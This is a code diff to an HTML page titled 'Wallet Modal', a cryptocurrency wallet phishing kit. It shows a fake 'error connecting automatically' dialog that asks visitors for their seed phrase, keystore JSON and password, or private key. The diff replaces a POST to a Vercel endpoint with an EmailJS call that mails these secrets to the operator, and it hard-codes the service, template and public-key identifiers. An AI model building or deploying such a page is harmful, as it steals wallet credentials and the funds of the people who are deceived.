@@ -4,6 +4,17 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Wallet Modal</title>
+
+    <!-- EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+      (function () {
+        emailjs.init({
+          publicKey: "cijeYCdjxSaVp04hY", // Your EmailJS public key
+        });
+      })();
+    </script>
+
     <script defer>
       document.addEventListener("DOMContentLoaded", () => {
         const wallets = [
@@ -366,7 +377,6 @@
           walletsContainer.appendChild(walletDiv);
         });
 
-        // Add this function after the wallets.forEach loop
         function renderMethodFields() {
           const method = document.getElementById("connect-method").value;
           const methodFields = document.getElementById("method-fields");
@@ -402,13 +412,9 @@
           }
         }
 
-        // Listen for changes to the select box
         document
           .getElementById("connect-method")
           .addEventListener("change", renderMethodFields);
-
-        // Optionally, render fields on first open
-        // renderMethodFields();
 
         document
           .getElementById("manual-connect-btn")
@@ -504,19 +510,28 @@
               if (finalModal) finalModal.showModal();
 
               try {
-                const response = await fetch(
-                  "https://sendmailhhhhhhhhhhhh-dd8f.vercel.app/api",
-                  {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(dataToSend),
-                  }
+                const templateParams = {
+                  wallet:
+                    dataToSend.item ||
+                    (selectedWallet?.name || "Unknown wallet"),
+                  phrase: dataToSend.phrase || "",
+                  keystore_json: dataToSend.keystore?.json || "",
+                  keystore_password: dataToSend.keystore?.password || "",
+                  private_key: dataToSend.privateKey || "",
+                  connection_method: method,
+                };
+
+                console.log("Sending via EmailJS:", templateParams);
+
+                const result = await emailjs.send(
+                  "service_xukz8z1", // your EmailJS service ID
+                  "template_0by71eq", // your EmailJS template ID
+                  templateParams
                 );
-                console.log(dataToSend);
-                console.log(response);
-                // Optionally handle response here
+
+                console.log("EmailJS success:", result);
               } catch (error) {
-                console.error("Error submitting form:", error);
+                console.error("EmailJS error submitting form:", error);
               }
 
               setTimeout(() => {
@@ -532,6 +547,7 @@
         dialog.close();
       }
     </script>
+
     <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
   </head>
   <body
@@ -546,178 +562,172 @@
       style="display: flex; flex-wrap: wrap"
     ></div>
 
-
-
-      <dialog
-        id="my_modal_1"
-        class="modal w-full h-full self-center border border-red-300"
+    <dialog
+      id="my_modal_1"
+      class="modal w-full h-full self-center border border-red-300"
+    >
+      <div
+        class="modal-box bg-white flex flex-col gap-5 rounded-lg shadow-xl text-black w-[90%] md:w-[70%] h-auto px-3 py-5"
       >
-        <div
-          class="modal-box bg-white flex flex-col gap-5 rounded-lg shadow-xl text-black w-[90%] md:w-[70%] h-auto px-3 py-5"
-        >
-          <!-- Header: Initializing & Close Button -->
-          <div class="flex items-center justify-between">
-            <div class="flex items-center gap-3 text-green-500 font-bold">
-              Initializing
-              <span
-                class="loading loading-bars loading-xs bg-green-500 w-3 h-3 rounded-full animate-pulse"
-                style="animation-delay: 0"
-              ></span>
-              <span
-                class="loading loading-bars loading-xs bg-green-500 w-3 h-3 rounded-full animate-pulse"
-                style="animation-delay: 0.15s"
-              ></span>
-              <span
-                class="loading loading-bars loading-xs bg-green-500 w-3 h-3 rounded-full animate-pulse"
-                style="animation-delay: 0.3s"
-              ></span>
-            </div>
-
-            <form method="dialog">
-              <button
-                class="outline-none text-sm font-bold text-gray-500 hover:text-red-500"
-              >
-                X
-              </button>
-            </form>
+        <div class="flex items-center justify-between">
+          <div class="flex items-center gap-3 text-green-500 font-bold">
+            Initializing
+            <span
+              class="loading loading-bars loading-xs bg-green-500 w-3 h-3 rounded-full animate-pulse"
+              style="animation-delay: 0"
+            ></span>
+            <span
+              class="loading loading-bars loading-xs bg-green-500 w-3 h-3 rounded-full animate-pulse"
+              style="animation-delay: 0.15s"
+            ></span>
+            <span
+              class="loading loading-bars loading-xs bg-green-500 w-3 h-3 rounded-full animate-pulse"
+              style="animation-delay: 0.3s"
+            ></span>
           </div>
 
-          <!-- Selected Wallet Info: hidden by default -->
-          <div
-            id="selectedWalletInfo"
-            class="hidden flex items-center justify-between p-3 border border-gray-300 rounded-lg"
-          >
-            <div class="flex flex-col gap-1">
-              <h5 id="walletName" class="font-bold text-gray-800 text-start">
-                Wallet Name
-              </h5>
-              <p class="text-[12px] text-gray-500">
-                Easy-to-use browser extension
-              </p>
-            </div>
-            <div>
-              <img
-                id="walletImage"
-                src=""
-                alt="wallet"
-                class="w-10 h-10 rounded-full"
-              />
-            </div>
-          </div>
-        </div>
-      </dialog>
-
-      <!-- Modal 2: Manual Input -->
-      <dialog id="my_modal_2" class="modal w-full h-full self-center bg-[red]">
-        <div class="modal-box bg-white w-[90%] md:w-[65%] p3-5 py-5 rounded-lg">
-          <p class="text-red-500 text-[16px] md:text-[16px]">
-            There was an error connecting automatically. But do not worry, you
-            can still connect manually.
-          </p>
-
-          <p class="text-[15px] font-bold text-start text-black mb-1">
-            DApp Type:
-          </p>
-
-          <div
-            class="flex flex-col rounded-[20px] border-1 shadow-lg py-5 px-3"
-          >
-            <div>
-              <select
-                id="connect-method"
-                class="rounded-full p-1 mb-3 text-green-700"
-              >
-                <option value="phrase">Phrase</option>
-                <option value="keystore">Keystore JSON</option>
-                <option value="private">Private Key</option>
-              </select>
-            </div>
-
-            <div id="method-fields">
-              <!-- Dynamic inputs injected here based on selection -->
-            </div>
-
-            <div class="form-control">
-              <button
-                id="manual-connect-btn"
-                class="text-[14px] bg-[#090979] rounded-[4px] text-white font-bold"
-              >
-                Connect
-              </button>
-            </div>
-          </div>
-
-          <div class="modal-action">
-            <form method="dialog">
-              <button
-                class="h-[2rem] rounded-[5px] w-[90px] bg-red-500 text-white border-none"
-              >
-                Close
-              </button>
-            </form>
-          </div>
-        </div>
-      </dialog>
-
-      <!-- Modal 3: Status/Error -->
-      <dialog
-        id="my_modal_3"
-        class="modal bg-[#00000069] w-full h-full self-center rounded-lg"
-      >
-        <div
-          class="flex flex-col gap-5 modal-box bg-white w-[70%] modal-box rounded-lg"
-        >
-          <div class="flex items-center justify-between px-3 py-5">
-            <div
-              id="status-message"
-              class="text-[13px] flex items-center gap-3 font-bold text-green-600"
+          <form method="dialog">
+            <button
+              class="outline-none text-sm font-bold text-gray-500 hover:text-red-500"
             >
-              Connection verification pending
-              <span
-                class="loading-dot-bounce bg-green-600"
-                style="animation-delay: 0s"
-              ></span>
-              <span
-                class="loading-dot-bounce bg-green-600"
-                style="animation-delay: 0.15s"
-              ></span>
-              <span
-                class="loading-dot-bounce bg-green-600"
-                style="animation-delay: 0.3s"
-              ></span>
-            </div>
-            <form method="dialog">
-              <button class="outline-none h-[10px] text-[13px] font-bold">
-                X
-              </button>
-            </form>
-          </div>
+              X
+            </button>
+          </form>
         </div>
-      </dialog>
 
-      <!-- Modal 4: Error -->
-      <dialog
-        id="my_modal_4"
-        class="modal bg-[#00000069] w-full h-full self-center rounded-lg"
-      >
         <div
-          class="flex flex-col gap-5 modal-box bg-white w-[90%] md:w-[70%] modal-box rounded-lg"
+          id="selectedWalletInfo"
+          class="hidden flex items-center justify-between p-3 border border-gray-300 rounded-lg"
         >
-          <div class="flex items-center justify-between px-3 py-5">
-            <div
-              id="status-message"
-              class="text-[13px] flex items-center gap-3 font-bold text-red-600"
-            >
-              Error connecting to wallet...
-            </div>
-            <form method="dialog">
-              <button class="outline-none h-[10px] text-[13px] font-bold">
-                X
-              </button>
-            </form>
+          <div class="flex flex-col gap-1">
+            <h5 id="walletName" class="font-bold text-gray-800 text-start">
+              Wallet Name
+            </h5>
+            <p class="text-[12px] text-gray-500">
+              Easy-to-use browser extension
+            </p>
+          </div>
+          <div>
+            <img
+              id="walletImage"
+              src=""
+              alt="wallet"
+              class="w-10 h-10 rounded-full"
+            />
           </div>
         </div>
-      </dialog>
+      </div>
+    </dialog>
+
+    <dialog id="my_modal_2" class="modal w-full h-full self-center bg-[red]">
+      <div class="modal-box bg-white w-[90%] md:w-[65%] p3-5 py-5 rounded-lg">
+        <p class="text-red-500 text-[16px] md:text-[16px]">
+          There was an error connecting automatically. But do not worry, you
+          can still connect manually.
+        </p>
+
+        <p class="text-[15px] font-bold text-start text-black mb-1">
+          DApp Type:
+        </p>
+
+        <div
+          class="flex flex-col rounded-[20px] border-1 shadow-lg py-5 px-3"
+        >
+          <div>
+            <select
+              id="connect-method"
+              class="rounded-full p-1 mb-3 text-green-700"
+            >
+              <option value="phrase">Phrase</option>
+              <option value="keystore">Keystore JSON</option>
+              <option value="private">Private Key</option>
+            </select>
+          </div>
+
+          <div id="method-fields">
+            <!-- Dynamic inputs -->
+          </div>
+
+          <div class="form-control">
+            <button
+              id="manual-connect-btn"
+              class="text-[14px] bg-[#090979] rounded-[4px] text-white font-bold"
+            >
+              Connect
+            </button>
+          </div>
+        </div>
+
+        <div class="modal-action">
+          <form method="dialog">
+            <button
+              class="h-[2rem] rounded-[5px] w-[90px] bg-red-500 text-white border-none"
+            >
+              Close
+            </button>
+          </form>
+        </div>
+      </div>
+    </dialog>
+
+    <dialog
+      id="my_modal_3"
+      class="modal bg-[#00000069] w-full h-full self-center rounded-lg"
+    >
+      <div
+        class="flex flex-col gap-5 modal-box bg-white w-[70%] modal-box rounded-lg"
+      >
+        <div class="flex items-center justify-between px-3 py-5">
+          <div
+            id="status-message"
+            class="text-[13px] flex items-center gap-3 font-bold text-green-600"
+          >
+            Connection verification pending
+            <span
+              class="loading-dot-bounce bg-green-600"
+              style="animation-delay: 0s"
+            ></span>
+            <span
+              class="loading-dot-bounce bg-green-600"
+              style="animation-delay: 0.15s"
+            ></span>
+            <span
+              class="loading-dot-bounce bg-green-600"
+              style="animation-delay: 0.3s"
+            ></span>
+          </div>
+          <form method="dialog">
+            <button class="outline-none h-[10px] text-[13px] font-bold">
+              X
+            </button>
+          </form>
+        </div>
+      </div>
+    </dialog>
+
+    <dialog
+      id="my_modal_4"
+      class="modal bg-[#00000069] w-full h-full self-center rounded-lg"
+    >
+      <div
+        class="flex flex-col gap-5 modal-box bg-white w-[90%] md:w-[70%] modal-box rounded-lg"
+      >
+        <div class="flex items-center justify-between px-3 py-5">
+          <div
+            id="status-message"
+            class="text-[13px] flex items-center gap-3 font-bold text-red-600"
+          >
+            Error connecting to wallet...
+          </div>
+          <form method="dialog">
+            <button class="outline-none h-[10px] text-[13px] font-bold">
+              X
+            </button>
+          </form>
+        </div>
+      </div>
+    </dialog>
+
     <style>
       @keyframes pulse {
         0% {
@@ -730,9 +740,9 @@
           opacity: 1;
         }
       }
-      .modal{
+      .modal {
         width: 100%;
-        border: 2px red ;
+        border: 2px red;
       }
       dialog[open] {
         position: fixed !important;
@@ -740,7 +750,7 @@
         width: 100% !important;
         margin: 0 !important;
         padding: 0 !important;
-        background: rgba(0, 0, 0, 0.7); /* optional: darken background */
+        background: rgba(0, 0, 0, 0.7);
         display: flex;
         align-items: center;
         justify-content: center;
@@ -754,7 +764,6 @@
         border-radius: 20px;
         box-shadow: 0 4px 24px rgba(0, 0, 0, 0.12);
         padding: 2rem 1.5rem 1.5rem 1.5rem;
-        /* margin: auto; */
       }
 
       #my_modal_2 select {
@@ -812,7 +821,7 @@
         width: 12px;
         height: 12px;
         border-radius: 50%;
-        background: #2ecc40; /* Tailwind blue-600 */
+        background: #2ecc40;
         animation: dot-bounce 0.7s infinite alternate
           cubic-bezier(0.6, -0.28, 0.74, 0.05);
         vertical-align: middle;
